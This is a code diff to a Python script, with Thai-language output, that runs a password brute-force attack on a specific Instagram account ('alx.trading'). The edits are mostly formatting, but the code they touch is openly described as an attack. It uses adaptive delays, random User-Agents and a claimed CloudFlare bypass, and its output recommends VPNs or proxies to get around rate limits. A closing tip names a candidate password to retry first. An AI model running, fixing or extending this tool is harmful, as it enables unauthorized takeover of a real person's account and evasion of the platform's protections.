@@ -6,7 +6,6 @@
 """
 
 import sys
-import os
 sys.path.append('/workspaces/sugarglitch-realops/scripts')
 
 try:
@@ -37,7 +36,8 @@ try:
 
         # ยืนยันก่อนเริ่ม
         confirm = input(
-            f"\n⚠️ เริ่มโจมตี {target_username} ด้วย {len(passwords):,} รหัสผ่าน? (y/N): ")
+            "\n⚠️ เริ่มโจมตี {} ด้วย {:,} รหัสผ่าน? (y/N): ".format(
+                target_username, len(passwords)))
 
         if confirm.lower() != 'y':
             print("❌ ยกเลิกการโจมตี")
@@ -46,38 +46,38 @@ try:
         # เริ่มโจมตี
         brute_forcer = InstagramBruteForcer(target_username)
 
-        print(f"\n🚀 เริ่มการโจมตี alx.trading...")
-        print(f"⚙️ การตั้งค่า:")
+        print("\n🚀 เริ่มการโจมตี alx.trading...")
+        print("⚙️ การตั้งค่า:")
         print(f"   📋 {len(passwords):,} รหัสผ่าน")
-        print(f"   🔄 Adaptive delay 2-30 วินาที")
-        print(f"   🎭 Random User-Agent")
-        print(f"   🛡️ CloudFlare bypass")
-        print(f"   🚨 Rate limit protection")
+        print("   🔄 Adaptive delay 2-30 วินาที")
+        print("   🎭 Random User-Agent")
+        print("   🛡️ CloudFlare bypass")
+        print("   🚨 Rate limit protection")
 
         success = brute_forcer.brute_force(passwords)
 
         # สรุปผล
-        print(f"\n" + "=" * 60)
-        print(f"📊 สรุปการโจมตี alx.trading:")
+        print("\n" + "=" * 60)
+        print("📊 สรุปการโจมตี alx.trading:")
 
         if success:
             print(f"🎉 พบรหัสผ่าน: {brute_forcer.found_password}")
-            print(f"💾 บันทึกผลลัพธ์ในโฟลเดอร์ results/")
+            print("💾 บันทึกผลลัพธ์ในโฟลเดอร์ results/")
         else:
-            print(f"💔 ไม่พบรหัสผ่านที่ถูกต้อง")
+            print("💔 ไม่พบรหัสผ่านที่ถูกต้อง")
 
-        print(f"📈 สถิติ:")
+        print("📈 สถิติ:")
         print(f"   🔢 ลองทั้งหมด: {brute_forcer.attempts:,} ครั้ง")
         print(f"   ❌ ล้มเหลว: {brute_forcer.failed_attempts:,} ครั้ง")
         print(f"   🚨 Rate limit: {brute_forcer.rate_limited} ครั้ง")
-        print(
-            f"   📊 อัตราสำเร็จ: {(1 if success else 0)/max(1, brute_forcer.attempts)*100:.1f}%")
+        success_rate = (1 if success else 0)/max(1, brute_forcer.attempts)*100
+        print(f"   📊 อัตราสำเร็จ: {success_rate:.1f}%")
 
         if brute_forcer.rate_limited > 5:
-            print(f"\n💡 คำแนะนำ: โดน rate limit มาก")
-            print(f"   - ลองใช้ VPN หรือเปลี่ยน IP")
-            print(f"   - รอหลายชั่วโมงก่อนลองใหม่")
-            print(f"   - ใช้ proxy server")
+            print("\n💡 คำแนะนำ: โดน rate limit มาก")
+            print("   - ลองใช้ VPN หรือเปลี่ยน IP")
+            print("   - รอหลายชั่วโมงก่อนลองใหม่")
+            print("   - ใช้ proxy server")
 
     if __name__ == "__main__":
         main()
@@ -100,7 +100,7 @@ print("""
 
 💡 What HTTP 400 means:
    ❌ NOT a wrong password indication
-   ❌ Request format/payload is incorrect  
+   ❌ Request format/payload is incorrect
    ❌ Missing required headers or parameters
    ❌ CSRF token expired or invalid
    ❌ Instagram API format changed
@@ -134,8 +134,8 @@ print("""
    🚨 Rate limited (temporary IP ban)
    🔧 HTTP 400 fix ready to deploy
    
-💡 PRO TIP: 
-   The password 'AlexInstagram2025' that caused HTTP 400 
+💡 PRO TIP:
+   The password 'AlexInstagram2025' that caused HTTP 400
    looks very promising - retry it first with the fixed format!
 
 🔄 When ready to continue:
